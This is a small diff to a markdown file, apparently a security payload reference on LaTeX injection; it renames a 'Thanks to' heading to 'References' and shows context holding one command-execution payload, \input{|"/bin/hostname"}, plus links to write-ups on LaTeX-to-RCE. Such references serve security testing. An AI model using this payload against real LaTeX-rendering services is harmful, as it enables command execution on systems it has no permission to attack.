@@ -66,7 +66,7 @@ If you get any LaTex error, consider using base64 to get the result without bad 
 \input{|"/bin/hostname"}
 ```
 
-## Thanks to
+## References
 
 * [Hacking with LaTeX - Sebastian Neef - 0day.work](https://0day.work/hacking-with-latex/)
 * [Latex to RCE, Private Bug Bounty Program - Yasho](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
